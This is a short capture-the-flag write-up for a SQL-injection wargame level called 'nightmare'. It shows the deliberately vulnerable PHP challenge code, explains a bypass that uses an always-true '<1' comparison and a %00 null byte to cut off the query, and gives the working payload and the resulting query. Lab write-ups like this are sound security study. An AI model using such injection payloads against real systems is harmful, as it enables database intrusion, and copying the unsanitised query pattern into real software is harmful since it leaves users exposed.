```
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

-> select * from table where column=''<1;
   will dump the first row of the table
-> select * from table where column=''<1;%00
   will ignore all the patterns after null

PAYLOAD: ?pw=%27)<1;%00
OUTPUT: select id from prob_nightmare where pw=('')<1;') and id!='admin'

Nightmare clear
